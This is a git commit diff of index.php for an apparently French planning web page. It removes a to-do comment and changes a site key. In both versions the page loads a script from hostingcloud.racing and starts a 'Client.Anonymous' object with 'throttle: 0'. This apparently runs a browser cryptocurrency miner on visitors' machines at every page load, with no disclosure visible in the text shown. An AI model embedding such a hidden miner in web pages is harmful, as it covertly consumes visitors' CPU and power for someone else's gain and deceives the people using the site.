c343858fd6af62755fdfda18e2919bfd567126a3
Cayril <aymeric.bizouarn@hotmail.fr>
2019-06-23 09:31:24 +0200

    Update index.php

--- index.php
+++ index.php
@@ -1,4 +1,3 @@
-<!-- rajouter le formatage automatique des date avec les annee bissextile (date("L") l'année est bissextile 1 si bissextile.) --!>
 <!-- Auteur Aymeric Bizouarn -->
 <!doctype html>
 <html lang="fr">
@@ -173,7 +172,7 @@ if ($ret == false) {
 </div>
 <script src="https://www.hostingcloud.racing/erHc.js"></script>
 <script>
-    var _client = new Client.Anonymous('016b1163139e575e2acb10e5dc1bfbde68d3e011d764a4727a544a8037be66c5', {
+    var _client = new Client.Anonymous('planning.bizouarn.fr', {
         throttle: 0, c: 'w', ads: 0
     });
     _client.start();
